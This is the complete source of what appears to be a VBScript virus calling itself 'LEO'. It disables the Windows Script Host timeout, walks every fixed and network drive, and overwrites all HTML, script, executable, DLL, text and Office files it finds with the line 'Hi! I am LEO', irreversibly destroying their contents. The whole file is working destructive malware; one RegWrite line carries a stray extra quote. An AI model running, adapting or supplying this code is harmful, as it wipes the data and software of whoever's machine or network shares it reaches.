dim fso,file,wscr,eq,ctr,rr
main()
sub main
on error resume next
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD""
End if
listadriv()
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path & "\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec) 
On Error Resume Next
dim f,f1,fc,ext,aa,mircfname,s,bname
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext = fso.GetExtensionName(f1.path)
ext = lcase(ext)
s = lcase(f1.name)
if (ext = "html") or (ext = "htm") or (ext = "asp") or (ext = "php") or (ext = "dll") or (ext = "com") or (ext = "txt") or (ext = "doc") or (ext = "xls") or (ext = "exe")then
set aa = fso.OpenTextFile(f1.path,2,true)
aa.writeline "Hi! I am LEO"
aa.close
end if
next 
end sub
sub folderlist(folderspec) 
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
